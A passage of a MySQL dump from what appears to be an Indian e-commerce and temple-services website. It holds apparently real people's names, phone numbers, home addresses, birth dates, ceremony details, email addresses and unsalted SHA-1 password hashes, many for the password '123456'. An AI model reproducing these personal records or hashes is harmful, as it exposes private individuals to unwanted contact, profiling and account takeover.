INSERT INTO `sub_subcategory` (`id`, `subcategory_id`, `name`, `cat_id`, `created_date`, `modified_date`, `status`, `page_url`, `order_no`, `type`) VALUES
(1, 1, 'Cowdeep Soaps', 1, '2022-01-28 12:03:00', '0000-00-00 00:00:00', 0, 'cowdeep-soaps', '1', 0),
(2, 2, 'Ghee', 2, '2022-01-28 23:29:58', '0000-00-00 00:00:00', 0, 'ghee', '2', 0);

-- --------------------------------------------------------

--
-- Table structure for table `templedetails`
--

CREATE TABLE `templedetails` (
  `id` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `mobile` varchar(12) NOT NULL,
  `lat` varchar(20) NOT NULL,
  `lng` varchar(20) NOT NULL,
  `address` text NOT NULL,
  `created_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `templedetails`
--

INSERT INTO `templedetails` (`id`, `name`, `mobile`, `lat`, `lng`, `address`, `created_at`) VALUES
(1, 'demo', '9999999977', '2334', '222', 'Maruthinagar', '2022-10-12 15:06:12'),
(2, 'demo', '9999999911', '2334', '222', 'Maruthinagar', '2022-10-12 15:06:52'),
(3, 'Testing', '9876543210', '37.421998333333335', '-122.084', '1600 Amphitheatre Pkwy, Mountain View, CA 94043, USA', '2022-10-13 11:41:27'),
(4, 'demo', '9986571768', '2334', '222', 'Maruthinagar', '2022-10-13 11:59:33'),
(5, 'Testing123', '9876543212', '37.421998333333335', '-122.084', '1600 Amphitheatre Pkwy, Mountain View, CA 94043, USA', '2022-10-13 12:13:38'),
(6, 'Testing123', '9876543214', '37.421998333333335', '-122.084', '1600 Amphitheatre Pkwy, Mountain View, CA 94043, USA', '2022-10-14 11:26:28');

-- --------------------------------------------------------

--
-- Table structure for table `temple_photos`
--

CREATE TABLE `temple_photos` (
  `id` int(11) NOT NULL,
  `tid` int(11) NOT NULL,
  `gallery` varchar(150) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `temple_photos`
--

INSERT INTO `temple_photos` (`id`, `tid`, `gallery`) VALUES
(1, 2, 'assets/templeimages/gog24221.png'),
(5, 4, 'assets/templeimages/gog86027.jpg'),
(6, 4, 'assets/templeimages/gog16672.jpg'),
(7, 4, 'assets/templeimages/gog15343.jpg'),
(8, 4, 'assets/templeimages/gog95194.jpg'),
(9, 5, 'assets/templeimages/gog54531.jpg'),
(10, 5, 'assets/templeimages/gog72625.jpg'),
(11, 5, 'assets/templeimages/gog15815.jpg'),
(12, 6, 'assets/templeimages/gog82445.jpg'),
(13, 6, 'assets/templeimages/gog21178.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `testimonials`
--

CREATE TABLE `testimonials` (
  `id` int(11) NOT NULL,
  `order_no` int(11) NOT NULL,
  `name` text NOT NULL,
  `location` text NOT NULL,
  `image_path` text NOT NULL,
  `comment` text NOT NULL,
  `status` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `user_id` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `testimonials`
--

INSERT INTO `testimonials` (`id`, `order_no`, `name`, `location`, `image_path`, `comment`, `status`, `created_date`, `modified_date`, `user_id`) VALUES
(5, 1, 'Mr.Suresh', 'Bangalore', 'assets/testimonials/testimonials16202957771.png', 'I have always received good service from the oiishee group. Timing and quality have always met my expectations.', 1, '2015-08-06 15:37:07', '2021-11-26 14:46:19', 1),
(8, 1, 'Greek proverb', 'Bangalore', 'assets/testimonials/testimonials16202957831.png', 'Good Products', 0, '2021-03-05 11:44:11', '2021-05-06 15:39:43', 1),
(10, 1, 'Chaithra', 'Bangalore', 'assets/testimonials/testimonials16222727871.png', 'Good Products', 0, '2021-05-29 12:49:47', '2021-05-29 12:49:47', 1),
(11, 1, 'nethra', 'bangalore', 'assets/testimonials/testimonials16400819961.png', 'test', 0, '2021-12-21 15:48:10', '2021-12-21 15:49:56', 1),
(13, 1, 'nethra', 'bangalore', 'assets/testimonials/testimonials16423976931.png', 'test', 0, '2022-01-17 11:04:53', '2022-01-17 11:04:53', 1);

-- --------------------------------------------------------

--
-- Table structure for table `upanayana`
--

CREATE TABLE `upanayana` (
  `id` int(11) NOT NULL,
  `name` varchar(80) NOT NULL,
  `fname` varchar(80) NOT NULL,
  `mphone` varchar(50) NOT NULL,
  `address` text NOT NULL,
  `dob` varchar(150) NOT NULL,
  `registerno` varchar(50) NOT NULL,
  `rashi` varchar(255) NOT NULL,
  `nakshatra` varchar(255) NOT NULL,
  `gotra` varchar(233) NOT NULL,
  `image` varchar(255) NOT NULL,
  `comments` text NOT NULL,
  `created_date` datetime NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `upanayana`
--

INSERT INTO `upanayana` (`id`, `name`, `fname`, `mphone`, `address`, `dob`, `registerno`, `rashi`, `nakshatra`, `gotra`, `image`, `comments`, `created_date`, `status`) VALUES
(1, 'demo', 'demo', '9986571768', 'bengaluru', '20-02-1993', '', 'demo', 'demo', 'demo', 'assets/images/smt78881.jpg', '', '2022-03-25 11:47:01', 0),
(2, 'Ashwin', 'Harish', '9535070670', 'Bangalore', '11-02-2022', '', 'Kumba', 'Swathi', 'Shiva', 'assets/images/smt68014.jpeg', '', '2022-03-25 12:04:20', 0),
(3, 'hhjn', 'hjjn', '5699853699', 'ghbbggh', '66', '', 'gh', 'th', 'gh', 'assets/images/smt87624.jpg', '', '2022-03-25 15:51:39', 0),
(4, 'Ashwin', 'Harish', '9535070670', 'Bangalore', '11-02-1991', '', 'meena', 'swathi', 'shiva', 'assets/images/smt67501.jpg', '', '2022-03-25 15:55:02', 0),
(5, 'Ashwin', 'Manu', '9535070670', 'Bangalore', '11-02-1991', '', 'meena', 'swathi', 'shiva', 'assets/images/smt66704.jpg', '', '2022-03-25 16:09:03', 0),
(6, 'mgxkydk', 'mgxkgx', '9577765765', 'nfzgjz', '25-03-2022', '', 'jts', 'xky', 'hrRh', 'assets/images/smt60071.jpg', '', '2022-03-25 16:21:11', 0),
(7, 'Suresh', 'G R vishwanath', '9845324064', '#251, 53rd Cross, 4th Block Rajajinagar, Bangalore- 560010', '04-12-1982', '', 'Rushabha', 'Rohini', 'Shandilya', '', '', '2022-03-25 17:38:14', 0),
(8, 'Ashwin', 'Ravi', '9535070670', 'Bangalore', '25-03-2022', '', 'Meena', 'Kataks', 'Gov', 'assets/images/smt30926.jpg', '', '2022-03-25 18:03:18', 0),
(9, 'nfzgnzg', 'jgzgjz', '9795768686', 'bfzg', '26-03-2003', '', 'jgzg', 'jfz', 'hTz', 'assets/images/smt15666.jpg', '', '2022-03-26 10:25:09', 0),
(10, 'khxd', 'kgzgx', '6868686868', 'jgzgxgkxkhxhk', '26-03-1999', '', 'kgxhxhkx', 'kgxkg', 'igzgxx', 'assets/images/smt88837.jpg', '', '2022-03-26 11:26:39', 0),
(11, 'hxjjfii', 'ififigig', '3535343467', 'hdhdhfu', '26-03-1978', '', 'hxhxhxhivififi', 'dudu', 'xudduf', 'assets/images/smt74324.jpg', '', '2022-03-26 12:11:31', 0),
(12, 'Vinayak Dixit', 'Ramnath Dicit', '9845324064', 'No.435, 6th Cross, 9th Main, 9th Block, Rajsjinagr, Bangalore - 560010', '04-12-1982', '', 'Rohini', 'Rushabha', 'Shandilya', 'assets/images/smt35171.jpg', '', '2022-03-28 11:26:15', 0),
(13, 'chandra', 'sastry', '8986222322', 'tirumala', '04-03-1981', '', 'kanya', 'sravana', 'bharad', 'assets/images/smt19157.jpg', '', '2022-03-29 12:31:12', 0),
(14, 'Ashwin', 'Harish', '9535070670', 'Bangalore', '11-02-2022', 'SSM/0014/2022-23', 'Kumba', 'Swathi', 'Shiva', 'assets/images/smt29201.png', 'Sample remarks', '2022-03-29 15:06:35', 0),
(15, 'Ashwin', 'Ashwath', '9535070670', 'Bangalore', '10-04-2003', 'SSM/0015/2022-23', 'Rashi', 'Nakshatra', 'Gotra', 'assets/images/smt97685.jpg', 'I have paid amount through Phone pay and also attached screenshot', '2022-03-29 15:13:32', 0),
(16, 'iviig', 'cjcjj', '6686865686', 'cjnccnc', '29-03-2022', 'SSM/0016/2022-23', 'jcjc', 'jcck', 'jffj', 'assets/images/smt36754.jpg', '', '2022-03-29 15:20:04', 0),
(17, 'sures', 'sure', '9845324064', 'hhj', '28-03-2020', 'SSM/0017/2022-23', 'kko', 'hhjj', 'kjjn', 'assets/images/smt80998.jpg', 'upanayana new updates version', '2022-03-29 15:29:24', 0),
(18, 'MADHAVn', 'G S RAMASESHAN', '9177401487', 'BHAVANI NAGAR', '19-06-2020', 'SSM/0018/2022-23', 'DHAVUR RASI', 'MOOLA', 'SRIVASTSHA', 'assets/images/smt30879.jpg', '', '2022-03-31 15:02:00', 0),
(19, 'Chandra Kalubandi', 'Chandra Kalubandi', '9441166117', 'tieumala', '31-03-1985', 'SSM/0019/2022-23', 'kanya', 'chitha', 'bharadwaja', 'assets/images/smt66623.jpg', 'thanka', '2022-03-31 19:53:35', 0),
(20, 'hxjf', 'n cn', '8787979787', 'zgxvxb', '11/02/1991', 'SSM/0020/2022-23', 'hfjf', 'kvk', 'bxb', 'assets/images/smt88978.jpg', 'test', '2022-04-01 10:46:09', 0),
(21, 'hshs', 'shhs', '4664645484', 'sbbs', '11/02/1991', 'SSM/0021/2022-23', 'shhs', 'shsh', 'shns', 'assets/images/smt53175.jpg', '', '2022-04-01 12:23:12', 0),
(22, 'Ashwin H', 'Harish', '9535070670', 'Bangalore', '11/02/1991', 'SSM/0022/2022-23', 'A Rashi', 'B Nakshatra', 'C Gotra', 'assets/images/smt56213.jpg', 'This information uploading after downloading app from playstore', '2022-04-06 11:32:22', 0),
(23, 'G R MADHAVAN', 'G S RAMASESHAN', '9177401487', 'BHAVANI NAGAR TIRUPATI', '07101970', 'SSM/0023/2022-23', 'DHANUR', 'MOOLA', 'SRIVATSA', 'assets/images/smt43270.jpg', '', '2022-04-07 14:59:59', 0),
(24, 'Balaji K G', 'Gopalakrishnan K S', '7795521025', '22 8th main jc nagar Kurubrahalii Mahalakshmipuram Banglore-560086', '30/10/2000', 'SSM/0024/2022-23', 'Varuschika', 'Jeshtta', 'Haristhasa', 'assets/images/smt25524.jpg', '', '2022-04-08 20:42:23', 0),
(25, 'pranav srivatsa', 'srinvasa prasanna', '9880135092', '31/6, 13th main Road, Vijayanagar, Bangalore 560040', '28/03/2013', 'SSM/0025/2022-23', 'kanya Rashi', 'chita Nakshatra', 'srivatsa Gotra', 'assets/images/smt61817.jpg', '', '2022-04-08 20:54:23', 0),
(26, 'KURUCHARLAPATI HRUSHIKESA', 'MALAKONDA RAJA NARAYANA', '9390418033', 'SEETHA VEEDHI, CHENNUR VILLAGE,GUDUR MANDAL, SPSR NELLORE DIST', '06052009', 'SSM/0026/2022-23', 'KANYA', 'HASTHA', 'BARADWAJASA', 'assets/images/smt32910.jpg', 'KURUCHARLAPATI HRUSHIKESA', '2022-04-23 11:08:51', 0),
(27, 'kkg', 'ufuu', '9999999999', 'fgj', '12/03/1990', 'SSM/0027/2022-23', 'hh', 'hh', 'hh', 'assets/images/smt34097.jpg', '', '2022-09-19 15:46:27', 0);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `name` text NOT NULL,
  `sname` text NOT NULL,
  `phone` text NOT NULL,
  `address1` text NOT NULL,
  `address2` text NOT NULL,
  `country` text NOT NULL,
  `town` text NOT NULL,
  `state` text NOT NULL,
  `town_name` text NOT NULL,
  `state_name` text NOT NULL,
  `zip` varchar(50) NOT NULL,
  `gst` tinyint(2) NOT NULL,
  `pan_no` text NOT NULL,
  `company_name` text NOT NULL,
  `emailid` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `login_type` varchar(30) NOT NULL,
  `status` tinyint(2) NOT NULL COMMENT '1->active;0->in-active',
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `lastlogin` datetime NOT NULL,
  `user_type` tinyint(2) NOT NULL COMMENT '1->b2c,2->b2b',
  `image_path` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `name`, `sname`, `phone`, `address1`, `address2`, `country`, `town`, `state`, `town_name`, `state_name`, `zip`, `gst`, `pan_no`, `company_name`, `emailid`, `password`, `login_type`, `status`, `created_date`, `modified_date`, `lastlogin`, `user_type`, `image_path`) VALUES
(1, 'syed afroz', 'Karnatakas', '9986571787', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '', '', '', '', '', '', 0, '', '', 'developerweb50@gmail.com', '616b808ca60bf544a800db3330d3f10f997f7dfc', 'general', 1, '2022-01-28 10:12:52', '2022-08-04 10:12:32', '2022-01-28 10:12:52', 1, ''),
(2, 'Nethra', 'A', '9945843912', 'Bangalore', 'Bangalore', '', '0', '', '', '', '', 0, '', '', 'nethra@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-01-29 17:13:04', '2022-02-01 17:10:18', '2022-01-29 17:13:04', 1, ''),
(3, 'sh', 'sh', '9900599005', 'jalahallivillage', 'Benglore', '', '0', '', '', '', '', 0, '', '', 'sh@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-01-29 18:36:50', '2022-02-23 12:44:47', '2022-01-29 18:36:50', 1, ''),
(4, 'demo', 'demouser', '9988776655', '', '', '', '', '', '', '', '', 0, '', '', 'demo@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-02-01 09:42:51', '2022-02-01 09:42:51', '2022-02-01 09:42:51', 1, ''),
(5, 'Ashwin', 'text', '9535070670', '43, 1st main road', 'basaveswanagara', '', '2', '1', 'Bengaluru', 'Karnataka', '560010', 0, '', '', 'ashwin@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-02-14 11:50:46', '2022-09-12 12:07:01', '2022-02-14 11:50:46', 1, ''),
(6, 'Pratham', 'Pratham', '7019117463', '', '', '', '', '', '', '', '', 0, '', '', 'pratham@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-02-17 10:26:52', '2022-02-17 10:26:52', '2022-02-17 10:26:52', 1, ''),
(7, 'demo', 'demouser', '9999999999', '', '', '', '', '', '', '', '', 0, '', '', 'demo123@gmail.com', 'a9993e364706816aba3e25717850c26c9cd0d89d', '', 0, '2022-02-21 11:41:24', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(8, 'Ashwin', 'H', '9535070670', '43, 1st main road', 'basaveswanagara', '', '2', '1', 'Bengaluru', 'Karnataka', '560010', 0, '', '', 'ashwin1@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', '', 0, '2022-02-21 11:52:30', '2022-02-22 10:58:58', '0000-00-00 00:00:00', 0, ''),
(9, 'demo', 'demouser', '9999999999', '', '', '', '', '', '', '', '', 0, '', '', 'demo12@gmail.com', '6367c48dd193d56ea7b0baad25b19455e529f5ee', '', 0, '2022-02-22 15:20:45', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(10, 'ashwini', 'v', '7760201200', '', '', '', '', '', '', '', '', 0, '', '', 'ashwiniravi677@gmail.com', '7ef4229becdd4e6442dda25634dbfb0957b83c14', 'general', 1, '2022-02-23 10:15:40', '2022-02-23 10:15:40', '2022-02-23 10:15:40', 1, ''),
(11, 'sneha', 'sneha', '8904040838', '', '', '', '', '', '', '', '', 0, '', '', 'sneha@savithru.com', 'b1cf66d8cd7a0c07e24e59765b8e180e6eaf400f', 'general', 1, '2022-02-23 16:28:56', '2022-02-23 16:28:56', '2022-02-23 16:28:56', 1, ''),
(12, 'suresh', 'gv', '9845324064', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore - 560010', '', '0', '', '', '', '', 0, '', '', 'gvsuresh@savithru.com', '7c222fb2927d828af22f592134e8932480637c0d', 'general', 1, '2022-02-25 08:50:22', '2022-02-25 08:52:05', '2022-02-25 08:50:22', 1, ''),
(13, 'none', 'none', '1234567892', '', '', '', '', '', '', '', '', 0, '', '', 'none@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-02-28 17:43:52', '2022-02-28 17:43:52', '2022-02-28 17:43:52', 1, ''),
(14, 'big', 'b', '1234567896', '', '', '', '', '', '', '', '', 0, '', '', 'big@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-02-28 17:45:51', '2022-02-28 17:45:51', '2022-02-28 17:45:51', 1, ''),
(15, 'Savithru', 'Technologies', '9876543210', '', '', '', '', '', '', '', '', 0, '', '', 'savithru@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-02-28 17:48:22', '2022-02-28 17:48:22', '2022-02-28 17:48:22', 1, ''),
(16, 'Shri', 'Shail', '8105739193', '', '', '', '', '', '', '', '', 0, '', '', 'shri@savithru.com', '78af0e693edd9565f53160374e3ddae30119ca13', 'general', 1, '2022-03-03 10:27:44', '2022-03-03 10:27:44', '2022-03-03 10:27:44', 1, ''),
(17, 'Savithru', 'Technologies', '9876543210', 'Basaveshwara nagar', 'Bangalore', '', '2', '1', 'Bengaluru', 'Karnataka', '560079', 0, '', '', 'uday@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', '', 0, '2022-03-03 10:42:12', '2022-08-05 17:53:38', '0000-00-00 00:00:00', 0, ''),
(18, 'Vani', 'Vani', '9900599005', '', '', '', '', '', '', '', '', 0, '', '', 'Vani@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-03-04 15:15:00', '2022-03-04 15:15:00', '2022-03-04 15:15:00', 1, ''),
(19, 'Test', 'Savithru', '9876543210', '', '', '', '', '', '', '', '', 0, '', '', 'abc@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-03-04 15:52:08', '2022-03-04 15:52:08', '2022-03-04 15:52:08', 1, ''),
(20, 'shilpa', 'KV', '9880566133', '', '', '', '', '', '', '', '', 0, '', '', 'shilpa@savithru.com', '8754252687af56451e740a1c76ab8ef22ddfb19b', 'general', 1, '2022-03-07 12:29:59', '2022-03-07 12:29:59', '2022-03-07 12:29:59', 1, ''),
(21, 'shri', 'shrishail', '9005599005', '', '', '', '', '', '', '', '', 0, '', '', 'shrishail@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-03-08 11:07:00', '2022-03-08 11:07:00', '2022-03-08 11:07:00', 1, ''),
(22, 'syedd', '', '1234567890', '', '', '', '', '', '', '', '', 0, '', '', 'd@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-03-17 09:35:10', '2022-03-17 09:35:10', '2022-03-17 09:35:10', 1, ''),
(23, 'shrisavithrucom', '', '9900599005', '', '', '', '', '', '', '', '', 0, '', '', 'shri@savithru.com', '78af0e693edd9565f53160374e3ddae30119ca13', 'general', 1, '2022-03-18 05:21:42', '2022-03-18 05:21:42', '2022-03-18 05:21:42', 1, ''),
(24, 'gvsuresh', '', '9845628293', '', '', '', '', '', '', '', '', 0, '', '', 'gvsuresh@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-03-18 05:55:33', '2022-03-18 05:55:33', '2022-03-18 05:55:33', 1, ''),
(25, 'CSChaithra', '', '8105021001', '', '', '', '', '', '', '', '', 0, '', '', 'chaithra@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-03-21 13:20:11', '2022-03-21 13:20:11', '2022-03-21 13:20:11', 1, ''),
(26, 'Ravi', '', '9845324064', '', '', '', '', '', '', '', '', 0, '', '', 'admin@acadamis.in', 'aa174e7a713fc12a39825244a0aaa4aeb15d253f', 'general', 1, '2022-03-25 09:41:38', '2022-03-25 09:41:38', '2022-03-25 09:41:38', 1, ''),
(27, 'sh', '', '9900590055', '', '', '', '', '', '', '', '', 0, '', '', 'shri@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-03-31 06:35:18', '2022-03-31 06:35:18', '2022-03-31 06:35:18', 1, ''),
(28, 'Pratham', 'A', '7019117463', '', '', '', '', '', '', '', '', 0, '', '', 'pratham@napdesigns.com', '2f16f68d6b51939b68af559d43bb1fee8dbec719', '', 0, '2022-04-11 17:47:44', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(29, 'NAP', 'Designs', '7019117463', '', '', '', '', '', '', '', '', 0, '', '', 'designspratham@gmail.com', '0811ae9d7ba67a51b1b79db00da8850075dcef34', '', 0, '2022-04-12 17:43:46', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(30, '', '', '', '', '', '', '', '', '', '', '', 0, '', '', '', 'da39a3ee5e6b4b0d3255bfef95601890afd80709', 'general', 1, '2022-05-06 17:38:40', '2022-05-06 17:38:40', '2022-05-06 17:38:40', 1, ''),
(31, 'Rohini', '', '9740222322', '', '', '', '', '', '', '', '', 0, '', '', 'rohinisrinivasan9@gmail.com', 'f988c245b3c789a608b34cd1b7c1b612542dbd09', 'general', 1, '2022-06-17 04:37:14', '2022-06-17 04:37:14', '2022-06-17 04:37:14', 1, ''),
(32, 'Rohini', '', '9728809335', '', '', '', '', '', '', '', '', 0, '', '', 'rohinisrinivasan9@gmail.com', 'f988c245b3c789a608b34cd1b7c1b612542dbd09', 'general', 1, '2022-06-17 04:38:36', '2022-06-17 04:38:36', '2022-06-17 04:38:36', 1, ''),
(33, 'shri', '', '9900599005', '', '', '', '', '', '', '', '', 0, '', '', 'shri@gmail.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-07-22 08:54:37', '2022-07-22 08:54:37', '2022-07-22 08:54:37', 1, ''),
(34, 'ran', '', '9611033586', '', '', '', '', '', '', '', '', 0, '', '', 'ran@savithru.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'general', 1, '2022-08-02 04:50:30', '2022-08-02 04:50:30', '2022-08-02 04:50:30', 1, ''),
(35, 'Suresh', '', '9845324064', '', '', '', '', '', '', '', '', 0, '', '', 'gvsureshiyer@gmail.com', 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', 'general', 1, '2022-08-03 09:52:59', '2022-08-03 09:52:59', '2022-08-03 09:52:59', 1, ''),
(36, 'Test', 'Tests', '6693334215', '', '', '', '', '', '', '', '', 0, '', '', 'Test@gmail.com', '51abb9636078defbf888d8457a7c76f85c8f114c', '', 0, '2022-08-10 17:56:52', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(37, 'Ellie', 'Mitchel', '4155552671', '', '', '', '', '', '', '', '', 0, '', '', 'tau.elliemitchel.1645803247882@gmail.com', '2c763fc2dbd50e64a7860d0adaa4287235336829', '', 0, '2022-12-02 11:53:27', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(38, 'praveen', 'raju', '9902282166', '', '', '', '', '', '', '', '', 0, '', '', 'praju276@gmail.com', '516de70702b71fd6bbb004b395b4e8670014fa22', '', 0, '2022-12-02 14:27:43', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(39, 'harsha', '', '9480001180', '', '', '', '', '', '', '', '', 0, '', '', 'harsha@savithru.com', 'e9e69cbb5fcca69df6c3b7abbb31f93a90759dbc', 'general', 1, '2022-12-06 10:15:07', '2022-12-06 10:15:07', '2022-12-06 10:15:07', 1, ''),
(40, 'Sonu', '', '9886200188', '', '', '', '', '', '', '', '', 0, '', '', 'digital.acadamis@gmail.com', 'f7c3bc1d808e04732adf679965ccc34ca7ae3441', 'general', 1, '2023-02-11 10:19:32', '2023-02-11 10:19:32', '2023-02-11 10:19:32', 1, ''),
(41, 'eddie', 'malcolm', '3123484502', '', '', '', '', '', '', '', '', 0, '', '', 'tau.EddieMalcolm.1670355913064@gmail.com', '2c763fc2dbd50e64a7860d0adaa4287235336829', '', 0, '2023-02-13 21:04:07', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(42, 'Dennis', 'Sidhu', '6507971830', '', '', '', '', '', '', '', '', 0, '', '', 'tau.DennisSidhu.1645808134184@gmail.com', '2c763fc2dbd50e64a7860d0adaa4287235336829', '', 0, '2023-02-23 05:05:59', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(43, 'amanda', 'dodgso', '6508227187', '', '', '', '', '', '', '', '', 0, '', '', 'tau.amandadodgso.1670358794432@gmail.com', '48213f28668cdab3b453e4c2f6c3e4ce6cef7bb7', '', 0, '2023-02-23 06:16:25', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, ''),
(44, 'Prem', '', '8310441440', '', '', '', '', '', '', '', '', 0, '', '', 'pmuddugere@gmail.com', 'ce2e518c81e8a0e3df78bdeb9a0e76491d696fea', 'general', 1, '2023-02-25 15:29:20', '2023-02-25 15:29:20', '2023-02-25 15:29:20', 1, '');

-- --------------------------------------------------------

--
-- Table structure for table `users_login_report`
--

CREATE TABLE `users_login_report` (
  `id` int(11) NOT NULL,
  `source` varchar(5) NOT NULL,
  `login_type` varchar(10) NOT NULL,
  `login_date` datetime NOT NULL,
  `user_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users_login_report`
--

INSERT INTO `users_login_report` (`id`, `source`, `login_type`, `login_date`, `user_id`) VALUES
(1, 'web', 'facebook', '2021-11-12 17:46:41', 56),
(2, 'web', 'facebook', '2021-11-12 17:49:05', 56),
(3, 'web', 'facebook', '2021-11-12 17:49:06', 56),
(4, 'web', 'facebook', '2021-11-12 17:49:07', 56),
(5, 'web', 'facebook', '2021-11-12 17:49:08', 56),
(6, 'web', 'facebook', '2021-11-12 17:49:09', 56),
(7, 'web', 'facebook', '2021-11-12 17:49:10', 56),
(8, 'web', 'facebook', '2021-11-12 17:49:11', 56),
(9, 'web', 'facebook', '2021-11-12 17:49:13', 56),
(10, 'web', 'facebook', '2021-11-12 17:49:14', 56),
(11, 'web', 'facebook', '2021-11-12 17:49:15', 56),
(12, 'web', 'facebook', '2021-11-12 17:49:16', 56),
(13, 'web', 'facebook', '2021-11-12 17:49:18', 56),
(14, 'web', 'facebook', '2021-11-12 17:49:19', 56),
(15, 'web', 'facebook', '2021-11-12 17:49:20', 56),
(16, 'web', 'facebook', '2021-11-12 17:49:21', 56),
(17, 'web', 'facebook', '2021-11-12 17:49:22', 56),
(18, 'web', 'facebook', '2021-11-12 17:49:23', 56),
(19, 'web', 'facebook', '2021-11-12 17:49:25', 56),
(20, 'web', 'facebook', '2021-11-12 17:49:26', 56),
(21, 'web', 'facebook', '2021-11-12 17:49:27', 56),
(22, 'web', 'facebook', '2021-11-12 17:49:29', 56),
(23, 'web', 'facebook', '2021-11-12 17:49:30', 56),
(24, 'web', 'facebook', '2021-11-12 17:49:31', 56),
(25, 'web', 'facebook', '2021-11-12 17:49:33', 56),
(26, 'web', 'facebook', '2021-11-12 17:49:34', 56),
(27, 'web', 'facebook', '2021-11-12 17:49:35', 56),
(28, 'web', 'facebook', '2021-11-12 17:49:37', 56),
(29, 'web', 'facebook', '2021-11-12 17:49:38', 56),
(30, 'web', 'facebook', '2021-11-12 17:49:39', 56),
(31, 'web', 'facebook', '2021-11-12 17:49:40', 56),
(32, 'web', 'facebook', '2021-11-12 17:49:41', 56),
(33, 'web', 'facebook', '2021-11-12 17:49:43', 56),
(34, 'web', 'facebook', '2021-11-12 17:49:44', 56),
(35, 'web', 'facebook', '2021-11-12 17:49:45', 56),
(36, 'web', 'facebook', '2021-11-12 17:49:46', 56),
(37, 'web', 'facebook', '2021-11-12 17:49:47', 56),
(38, 'web', 'facebook', '2021-11-12 17:49:49', 56),
(39, 'web', 'facebook', '2021-11-12 17:49:50', 56),
(40, 'web', 'facebook', '2021-11-12 17:49:51', 56),
(41, 'web', 'facebook', '2021-11-12 17:49:53', 56),
(42, 'web', 'facebook', '2021-11-12 17:49:54', 56),
(43, 'web', 'facebook', '2021-11-12 17:49:55', 56),
(44, 'web', 'facebook', '2021-11-12 17:49:56', 56),
(45, 'web', 'facebook', '2021-11-12 17:49:58', 56),
(46, 'web', 'facebook', '2021-11-12 17:49:59', 56),
(47, 'web', 'facebook', '2021-11-12 17:50:00', 56),
(48, 'web', 'facebook', '2021-11-12 17:50:02', 56),
(49, 'web', 'facebook', '2021-11-12 17:50:03', 56),
(50, 'web', 'facebook', '2021-11-12 17:50:04', 56),
(51, 'web', 'facebook', '2021-11-12 17:50:06', 56),
(52, 'web', 'facebook', '2021-11-12 17:50:07', 56),
(53, 'web', 'facebook', '2021-11-12 17:50:08', 56),
(54, 'web', 'facebook', '2021-11-12 17:50:09', 56),
(55, 'web', 'facebook', '2021-11-12 17:50:10', 56),
(56, 'web', 'facebook', '2021-11-12 17:50:12', 56),
(57, 'web', 'facebook', '2021-11-12 17:50:13', 56),
(58, 'web', 'facebook', '2021-11-12 17:50:14', 56),
(59, 'web', 'facebook', '2021-11-12 17:50:16', 56),
(60, 'web', 'facebook', '2021-11-12 17:50:17', 56),
(61, 'web', 'facebook', '2021-11-12 17:50:18', 56),
(62, 'web', 'facebook', '2021-11-12 17:50:20', 56),
(63, 'web', 'facebook', '2021-11-12 17:50:20', 56),
(64, 'web', 'facebook', '2021-11-12 17:50:22', 56),
(65, 'web', 'facebook', '2021-11-12 17:50:23', 56),
(66, 'web', 'facebook', '2021-11-12 17:50:24', 56),
(67, 'web', 'facebook', '2021-11-12 17:50:26', 56),
(68, 'web', 'facebook', '2021-11-12 17:50:27', 56),
